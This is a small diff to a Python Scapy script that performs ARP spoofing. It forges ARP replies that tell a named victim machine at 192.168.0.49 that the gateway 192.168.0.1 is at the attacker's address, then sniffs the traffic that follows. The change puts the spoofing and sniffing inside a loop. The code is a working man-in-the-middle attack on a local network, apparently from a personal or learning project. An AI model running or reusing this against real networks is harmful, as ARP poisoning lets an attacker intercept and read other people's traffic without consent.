@@ -11,9 +11,10 @@ answer = srp(entire_packet, timeout = 2, verbose = True)[0]
 
 ## Creating Malicous ARP Response to victims machine
 
-target_mac_addr = answer[0][1].hwsrc
-packet = ARP(op=2, hwdst = target_mac_addr, pdst='192.168.0.49', psrc='192.168.0.1')
-send(packet, verbose = False)
+for i in range(2):
+    target_mac_addr = answer[0][1].hwsrc
+    packet = ARP(op=2, hwdst = target_mac_addr, pdst='192.168.0.49', psrc='192.168.0.1')
+    send(packet, verbose = False)
 
-pkt = sniff(count = 10, prn = lambda x: x[0].show())
+    pkt = sniff(count = 10, prn = lambda x: x[0].show())
 
